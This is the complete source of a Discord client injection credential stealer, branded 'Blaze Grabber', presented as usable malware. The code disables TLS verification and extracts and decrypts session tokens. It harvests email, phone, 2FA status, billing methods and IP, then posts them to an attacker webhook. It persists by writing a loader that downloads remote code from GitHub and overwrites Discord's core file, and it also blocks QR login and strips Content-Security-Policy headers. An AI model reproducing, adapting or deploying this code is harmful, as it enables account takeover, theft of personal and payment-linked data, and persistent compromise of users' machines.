'use strict';

process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';

const fs          = require('fs');
const path        = require('path');
const https       = require('https');
const querystring = require('querystring');
const { BrowserWindow, session, safeStorage } = require('electron');

const WEBHOOK    = '%WEBHOOK%';
const AVATAR_URL = 'https://i.imgur.com/CHB4vW7.gif';
const EMBED_COLOR = 0x8563FF;
const BOT_NAME   = 'Blaze Grabber';
const INJECT_URL = 'https://raw.githubusercontent.com/blazewys/discordinjection/refs/heads/main/dcinject.js';

let _initDone   = false;
let _updateDone = false;

const execScript = (script) => {
    const win = BrowserWindow.getAllWindows()[0];
    return win.webContents.executeJavaScript(script, true);
};

const GET_ALL_TOKENS_SCRIPT = `(function(){
    try {
        var f = document.createElement('iframe');
        document.body.appendChild(f);
        var ls = Object.getOwnPropertyDescriptor(f.contentWindow,'localStorage').get.call(window);
        f.remove();
        var result = [];
        
        if (ls.token) result.push(ls.token);
        
        try {
            var multi = ls.tokens;
            if (multi) {
                var parsed = JSON.parse(multi);
                if (Array.isArray(parsed)) {
                    parsed.forEach(function(t){ if(t && result.indexOf(t)===-1) result.push(t); });
                } else if (typeof parsed === 'object') {
                    Object.values(parsed).forEach(function(t){ if(t && result.indexOf(t)===-1) result.push(t); });
                }
            }
        } catch(e) {}
        
        try {
            var mas = ls.MultiAccountStore;
            if (mas) {
                var mObj = JSON.parse(mas);
                var accounts = mObj.users || mObj.accounts || [];
                accounts.forEach(function(a){ var t = a.token||a.accessToken; if(t && result.indexOf(t)===-1) result.push(t); });
            }
        } catch(e) {}
        return result;
    } catch(e) { return []; }
})()`;

async function getAllTokens(retries = 8, delayMs = 2000) {
    for (let i = 0; i < retries; i++) {
        try {
            const encrypted = await execScript(GET_ALL_TOKENS_SCRIPT);
            if (Array.isArray(encrypted) && encrypted.length > 0) {
                const tokens = [];
                for (const enc of encrypted) {
                    try {
                        if (enc && enc.includes('dQw4w9WgXcQ:')) {
                            const b64   = enc.replace(/^"?dQw4w9WgXcQ:/, '').replace(/"$/, '').trim();
                            const buf   = Buffer.from(b64, 'base64');
                            const token = safeStorage.decryptString(buf);
                            if (token && !tokens.includes(token)) tokens.push(token);
                        } else if (enc && !enc.includes('dQw4w9WgXcQ:')) {
                            
                            if (!tokens.includes(enc)) tokens.push(enc);
                        }
                    } catch {}
                }
                if (tokens.length > 0) return tokens;
            }
        } catch {}
        if (i < retries - 1) await sleep(delayMs);
    }
    return [];
}

async function getToken(retries = 3, delayMs = 1000) {
    const tokens = await getAllTokens(retries, delayMs);
    return tokens.length > 0 ? tokens[0] : null;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function apiGet(endpoint, token) {
    return new Promise(resolve => {
        const url = new URL(endpoint);
        const req = https.request({
            hostname: url.hostname,
            path:     url.pathname + url.search,
            method:   'GET',
            headers:  {
                'Authorization': token,
                'Content-Type':  'application/json',
                'User-Agent':    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            },
            timeout: 10000,
        }, res => {
            let b = '';
            res.on('data', d => b += d);
            res.on('end', () => { try { resolve(JSON.parse(b)); } catch { resolve(null); } });
        });
        req.on('error',   () => resolve(null));
        req.on('timeout', () => { req.destroy(); resolve(null); });
        req.end();
    });
}

async function getIP() {
    return new Promise(resolve => {
        const req = https.get('https://api.ipify.org?format=json', { timeout: 8000 }, res => {
            let b = '';
            res.on('data', d => b += d);
            res.on('end', () => { try { resolve(JSON.parse(b).ip || 'N/A'); } catch { resolve('N/A'); } });
        });
        req.on('error',   () => resolve('N/A'));
        req.on('timeout', () => { req.destroy(); resolve('N/A'); });
    });
}

async function resolveAvatar(baseUrl) {
    if (!baseUrl) return null;
    return new Promise(resolve => {
        const gifUrl = baseUrl + '.gif?size=512';
        const req = https.get(gifUrl, { timeout: 6000 }, res => {
            resolve(res.headers['content-type'] === 'image/gif'
                ? gifUrl : baseUrl + '.png?size=512');
        });
        req.on('error',   () => resolve(baseUrl + '.png?size=512'));
        req.on('timeout', () => { req.destroy(); resolve(baseUrl + '.png?size=512'); });
    });
}

async function postWebhook(payload) {
    return new Promise(resolve => {
        const body = JSON.stringify(payload);
        const url  = new URL(WEBHOOK);
        const req  = https.request({
            hostname: url.hostname,
            path:     url.pathname + url.search,
            method:   'POST',
            headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
            timeout:  15000,
        }, res => { res.resume(); resolve(res.statusCode); });
        req.on('error',   () => resolve(null));
        req.on('timeout', () => { req.destroy(); resolve(null); });
        req.write(body);
        req.end();
    });
}

const PROFILE_BADGE_MAP = {
    'staff':                    '<:discordstaff:1533643624447742103>',
    'partner':                  '<:discordpartner:1533643693444038698>',
    'hypesquad':                '<:hypesquad:1533643806463758416>',
    'bug_hunter_level_1':       '<:bughunter:1533644155996078160>',
    'hypesquad_online_house_1': '<:bravery:1533643863842095214>',
    'hypesquad_online_house_2': '<:brilliance:1533643948197679284>',
    'hypesquad_online_house_3': '<:balance:1533643975586615397>',
    'hypesquad_house_1':        '<:bravery:1533643863842095214>',
    'hypesquad_house_2':        '<:brilliance:1533643948197679284>',
    'hypesquad_house_3':        '<:balance:1533643975586615397>',
    'premium_early_supporter':  '<:early:1533644073271824516>',
    'bug_hunter_level_2':       '<:bughunter2:1533644547287023636>',
    'verified_developer':       '<:botdev:1533644656670277742>',
    'certified_moderator':      '<:certifiedmod:1533644782189023437>',
    'active_developer':         '<:botdev2:1533644711997341808>',
    'legacy_username':          '<:username:1533644918587789544>',
    'quest_completed':          '<:quest:1533645015279075342>',
    'orb_profile_badge':        '<a:orbs:1533645071373828136>',
    'guild_booster_lvl1':       '<:boost1m:1533642446863466646>',
    'guild_booster_lvl2':       '<:boost2m:1533642495131517139>',
    'guild_booster_lvl3':       '<:boost3m:1533642557563736155>',
    'guild_booster_lvl4':       '<:boost6m:1533642618683129987>',
    'guild_booster_lvl5':       '<:boost9m:1533642652141097041>',
    'guild_booster_lvl6':       '<:boost12m:1533642671183106130>',
    'guild_booster_lvl7':       '<:boost15m:1533642737633726474>',
    'guild_booster_lvl8':       '<:boost18m:1533642756440723497>',
    'guild_booster_lvl9':       '<:boost24m:1533642793682079804>',
    'premium_tenure_1_month':   '<:nitrobronze:1533643137577254995>',
    'premium_tenure_3_month':   '<:nitrosilver:1533643181974093894>',
    'premium_tenure_6_month_v2':'<:nitrogold:1533642929153773829>',
    'premium_tenure_12_month':  '<:nitroplatinum:1533643299536244797>',
    'premium_tenure_24_month':  '<:nitrodiamond:1533643343798734991>',
};

function getBadges(user) {
    const profileBadges = (user._profile_badges || []).map(b =>
        PROFILE_BADGE_MAP[b.id] || null
    ).filter(Boolean);
    return profileBadges.length ? profileBadges.join(' ') : '<:no:1533642070701641889>';
}

function getNitro(user) {
    const t = user.premium_type;
    if (!t) return '<:no:1533642070701641889>';
    const labels = { 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic' };
    return `<:nitro:1533639641687920823> ${labels[t] || 'Nitro'}`;
}

function parseBilling(sources) {
    if (!sources || !sources.length) return '<:no:1533642070701641889>';
    const cards   = sources.filter(s => s.type === 1 && !s.invalid).length;
    const paypals = sources.filter(s => s.type === 2 && !s.invalid).length;
    const parts = [];
    if (cards)   parts.push(cards   > 1 ? `<:card:1533639749376671785> x${cards}`   : '<:card:1533639749376671785>');
    if (paypals) parts.push(paypals > 1 ? `<:paypal:1533641104480538695> x${paypals}` : '<:paypal:1533641104480538695>');
    return parts.length ? parts.join(' ') : '<:no:1533642070701641889>';
}

function buildPayload(title, fields, thumbnail, image) {
    const embed = {
        title,
        color:     EMBED_COLOR,
        fields,
        footer:    { text: BOT_NAME },
        timestamp: new Date().toISOString(),
    };
    if (thumbnail) embed.thumbnail = { url: thumbnail };
    if (image)     embed.image     = { url: image };
    return { username: BOT_NAME, avatar_url: AVATAR_URL, embeds: [embed] };
}

async function buildUserInfo(token) {
    const [user, billing] = await Promise.all([
        apiGet('https://discord.com/api/v9/users/@me',                         token),
        apiGet('https://discord.com/api/v9/users/@me/billing/payment-sources', token),
    ]);
    if (!user || user.message) return null;

    
    try {
        const profileJson = await execScript(`(function(){
            var x = new XMLHttpRequest();
            x.open("GET", "https://discord.com/api/v9/users/${user.id}/profile?with_mutual_guilds=false", false);
            x.setRequestHeader("Authorization", ${JSON.stringify(token)});
            x.send(null);
            try { return JSON.parse(x.responseText); } catch(e) { return null; }
        })()`);
        if (profileJson && !profileJson.message) {
            if (profileJson.premium_guild_since) user.premium_guild_since = profileJson.premium_guild_since;
            user._profile_badges = Array.isArray(profileJson.badges) ? profileJson.badges : [];
        } else {
            user._profile_badges = [];
        }
    } catch {
        user._profile_badges = [];
    }

    const [avatar, banner] = await Promise.all([
        resolveAvatar(user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}` : null),
        resolveAvatar(user.banner ? `https://cdn.discordapp.com/banners/${user.id}/${user.banner}` : null),
    ]);
    return { user, billing, avatar, banner };
}

function buildFields(user, billing, friends, token, extra) {
    
    const cards   = (billing || []).filter(s => s.type === 1).length;
    const paypals = (billing || []).filter(s => s.type === 2).length;
    const billingParts = [];
    if (cards)   billingParts.push(`\`${cards} card${cards > 1 ? 's' : ''} found\``);
    if (paypals) billingParts.push(`\`${paypals} PayPal${paypals > 1 ? 's' : ''} found\``);
    const billingVal = billingParts.length ? billingParts.join(' ') : '<:no:1533642070701641889>';

    
    const info = [
        
        `<:user:1533638622761455637> **Username:** \`${user.username}\``,
        `<:mail:1533638816559140877> **Email:** \`${user.email || 'N/A'}\``,
        `<:phone:1533639066057179136> **Phone:** \`${user.phone || 'N/A'}\``,
        '',
        
        `<:lock:1533640371882557501> **2FA:** ${user.mfa_enabled ? '<:tick:1533641966632435936>' : '<:no:1533642070701641889>'}`,
        `<:nitro:1533639641687920823> **Nitro:** ${getNitro(user)}`,
        `<:card:1533639749376671785> **Billing:** ${billingVal}`,
        `<:badge:1533639967761240154> **Badges:** ${getBadges(user)}`,
        '',
        
        ...(extra || []),
    ].join('\n');

    return [
        { name: 'Discord Info', value: info,                                                    inline: false },
        { name: '<:token:1533639840254660640> Token', value: `\`\`\`${token}\`\`\``,            inline: false },
    ];
}

function getDiscordClientName() {
    const parts = __dirname.replace(/\\/g, '/').split('/');
    for (let i = parts.length - 1; i >= 0; i--) {
        if (/^Discord(PTB|Canary|Development)?$/i.test(parts[i])) return parts[i];
    }
    return 'Discord';
}

async function firstTime() {
    if (_initDone) return;
    _initDone = true;

    try {
        const ip     = await getIP();
        const client = getDiscordClientName();
        const tokens = await getAllTokens(8, 2000);

        if (!tokens.length) {
            await postWebhook(buildPayload(
                'Discord Injection — No Session',
                [
                    {
                        name: 'Info',
                        value: [
                            `<:computer:1533640158740615168> **Computer:** \`${process.env.COMPUTERNAME || 'N/A'}\``,
                            `<:ip:1533640242437816390> **IP:** \`${ip}\``,
                            `<:web:1533641362975621270> **Client:** \`${client}\``,
                        ].join('\n'),
                        inline: false
                    }
                ],
                AVATAR_URL, null
            ));
            return;
        }

        
        for (const token of tokens) {
            try {
                const info = await buildUserInfo(token);
                if (!info) continue;
                const { user, billing, avatar, banner } = info;
                const extraLines = [
                    `<:computer:1533640158740615168> **Computer:** \`${process.env.COMPUTERNAME || 'N/A'}\``,
                    `<:ip:1533640242437816390> **IP:** \`${ip}\``,
                    `<:web:1533641362975621270> **Client:** \`${client}\``,
                ];
                const fields = buildFields(user, billing, null, token, extraLines);
                await postWebhook(buildPayload(
                    'Discord Injection — Initialized',
                    fields,
                    avatar || AVATAR_URL, banner || null
                ));
            } catch {}
        }
    } catch {}
}

function updateCheck() {
    if (_updateDone) return;
    _updateDone = true;
    try {
        const exeDir       = path.dirname(process.execPath);
        const resourcePath = path.join(exeDir, 'resources');
        if (!fs.existsSync(resourcePath)) return;

        const appDir  = path.join(resourcePath, 'app');
        const appAsar = path.join(resourcePath, 'app.asar');

        const modulesDir = path.join(exeDir, 'modules');
        if (!fs.existsSync(modulesDir)) return;
        const coreFolder = fs.readdirSync(modulesDir).find(x => /^discord_desktop_core-\d+$/.test(x));
        if (!coreFolder) return;
        const indexJs = path.join(modulesDir, coreFolder, 'discord_desktop_core', 'index.js');

        if (!fs.existsSync(appDir)) fs.mkdirSync(appDir, { recursive: true });
        fs.writeFileSync(path.join(appDir, 'package.json'),
            JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));

        const script = [
            `const fs=require('fs'),https=require('https');`,
            `const idx=${JSON.stringify(indexJs)};`,
            `const url=${JSON.stringify(INJECT_URL)};`,
            `const wh=${JSON.stringify(WEBHOOK)};`,
            `function init(){https.get(url,{timeout:15000},res=>{`,
            `  let d='';res.on('data',c=>d+=c);`,
            `  res.on('end',()=>{try{`,
            `    const cur=fs.readFileSync(idx,'utf8');`,
            `    if(cur.length<20000||cur==="module.exports = require('./core.asar');")`,
            `      fs.writeFileSync(idx,d.replace('%WEBHOOK%',wh));`,
            `  }catch{}});`,
            `}).on('error',()=>setTimeout(init,10000));}`,
            `init();`,
            `require(${JSON.stringify(appAsar)});`,
        ].join('\n');

        fs.writeFileSync(path.join(appDir, 'index.js'), script);
    } catch {}
}

function parseUploadData(details) {
    try {
        if (!details.uploadData || !details.uploadData[0]) return null;
        const raw = Buffer.from(details.uploadData[0].bytes).toString('utf8');
        if (!raw) return null;
        try { return JSON.parse(raw); }
        catch { return querystring.parse(decodeURIComponent(raw)); }
    } catch { return null; }
}

session.defaultSession.webRequest.onCompleted({
    urls: [
        'https://discord.com/api/v*/users/@me',
        'https://discordapp.com/api/v*/users/@me',
        'https://discord.com/api/v*/auth/login',
        'https://discordapp.com/api/v*/auth/login',
        'https://api.braintreegateway.com/merchants/*/payment_methods/paypal_accounts',
        'https://api.stripe.com/v*/tokens',
        'https://discord.com/api/v*/applications/detectable',
        'https://discord.com/api/v*/users/@me/library',
    ],
}, (details, callback) => {
    firstTime().catch(() => {});
    updateCheck();
    callback({});
});

// QR login engeli — WebSocket bağlantısı açılmadan önce iptal et
session.defaultSession.webRequest.onBeforeRequest({
    urls: ['wss://remote-auth-gateway.discord.gg/*'],
}, (details, callback) => {
    callback({ cancel: true });
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    const headers = details.responseHeaders || {};
    // CSP'yi hem lowercase hem uppercase key formatında sil
    for (const key of Object.keys(headers)) {
        const lower = key.toLowerCase();
        if (lower === 'content-security-policy' || lower === 'content-security-policy-report-only') {
            delete headers[key];
        }
    }
    headers['Access-Control-Allow-Headers'] = ['*'];
    callback({ responseHeaders: headers });
});

module.exports = require('./core.asar');
